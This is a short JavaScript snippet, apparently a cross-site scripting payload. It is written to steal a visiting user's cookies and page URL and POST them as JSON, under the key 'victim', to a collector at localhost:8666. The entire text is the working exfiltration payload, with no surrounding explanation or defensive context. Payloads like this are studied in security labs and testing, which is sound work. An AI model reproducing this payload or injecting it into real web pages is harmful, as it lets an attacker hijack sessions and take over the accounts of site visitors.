fetch("http://localhost:8666/", {
  method: "POST", headers: {
    'Content-Type': 'application/json'
    // 'Content-Type': 'application/x-www-form-urlencoded',
  }, body: JSON.stringify({ victim: window.location.href, cookies: document.cookie })
})